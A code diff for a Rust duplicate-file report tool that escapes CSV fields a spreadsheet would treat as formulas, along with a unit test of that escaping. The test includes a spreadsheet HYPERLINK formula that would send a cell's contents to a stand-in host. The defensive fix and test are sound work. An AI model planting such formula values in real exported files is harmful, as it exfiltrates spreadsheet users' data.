@@ -722,9 +722,13 @@ pub fn write_csv(report: &DupeReport, out: &mut impl Write) -> io::Result<()> {
     Ok(())
 }
 
-/// Quote a CSV field if it needs it (RFC 4180).
+/// Quote a CSV field if it needs it (RFC 4180). A field that a spreadsheet would read as a
+/// formula, one starting with `=`, `+`, `-`, `@`, a tab or a carriage return (file names can),
+/// gets a leading `'`, which spreadsheets read as the start of text.
 fn csv_field(value: &str) -> String {
-    if value.contains([',', '"', '\n', '\r']) {
+    if value.starts_with(['=', '+', '-', '@', '\t', '\r']) {
+        format!("\"'{}\"", value.replace('"', "\"\""))
+    } else if value.contains([',', '"', '\n', '\r']) {
         format!("\"{}\"", value.replace('"', "\"\""))
     } else {
         String::from(value)
@@ -1007,6 +1011,36 @@ mod tests {
              1,exact,aaa,100,false,exact,/lib,\"with, comma \"\"and quotes\"\".jpg\",\
              1970-01-01T00:00:01Z\n"
         );
+    }
+
+    #[test]
+    fn test_csv_fields_a_spreadsheet_would_run_are_text() {
+        for (value, field) in [
+            (
+                "=HYPERLINK(\"http://x/?\"&A1).jpg",
+                "\"'=HYPERLINK(\"\"http://x/?\"\"&A1).jpg\"",
+            ),
+            ("+1.jpg", "\"'+1.jpg\""),
+            ("-1.jpg", "\"'-1.jpg\""),
+            (
+                "@eaDir/IMG_1.JPG/SYNOPHOTO_THUMB_M.jpg",
+                "\"'@eaDir/IMG_1.JPG/SYNOPHOTO_THUMB_M.jpg\"",
+            ),
+            ("\tx.jpg", "\"'\tx.jpg\""),
+            ("\rx.jpg", "\"'\rx.jpg\""),
+            ("a=b.jpg", "a=b.jpg"),
+            ("/lib", "/lib"),
+        ] {
+            assert_eq!(csv_field(value), field, "{:?}", value);
+        }
+        let fx = Fixture::new();
+        fx.add("/lib", "a.jpg", 100, 0, Some("aaa"));
+        fx.add("/lib", "=1+1.jpg", 100, 1, Some("aaa"));
+        let mut out = vec![];
+        write_csv(&fx.report(), &mut out).unwrap();
+        assert!(String::from_utf8(out)
+            .unwrap()
+            .contains(",/lib,\"'=1+1.jpg\","),);
     }
 
     #[test]
